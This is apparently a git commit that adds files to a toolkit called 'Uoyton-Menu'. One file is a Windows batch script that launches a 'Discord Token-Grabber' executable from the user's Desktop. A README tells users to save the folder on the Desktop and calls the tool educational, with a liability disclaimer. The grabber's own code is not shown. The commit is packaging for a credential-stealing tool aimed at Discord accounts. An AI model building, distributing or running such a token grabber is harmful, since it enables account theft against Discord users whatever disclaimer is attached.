876c98d0ab28e136e3abecd69273e273adf41237
NotYou <max@maximilian-kuttig.de>
2024-07-03 23:52:12 +0200

    Uoyton-Menu v.1.0 [BETA]
    In the next update will be a new design 🎁

---
+++ Uoyton-Menu Tool/Discord-Tokengrabber/Start Tokengrabber.bat
@@ -0,0 +1,6 @@
+@echo off
+title Start DC Token-Grabber 
+
+echo Enter the PC Username for opening the file: (Example: Barack Obama) 
+set /p user= 
+start C:\Users\%user%\Desktop\Tokengrabber\Tokengrabber\bin\Debug\Tokengrabber.exe
---
+++ Uoyton-Menu Tool/README.txt
@@ -0,0 +1,4 @@
+SAVE THE MENU FOLDER ON THE DESKTOP!!!
+I take NO liability for any things done with this program!
+DONT do illegal thinks with this tool! 
+This Tool is for 🛡️Educational Purposes Only!🛡️
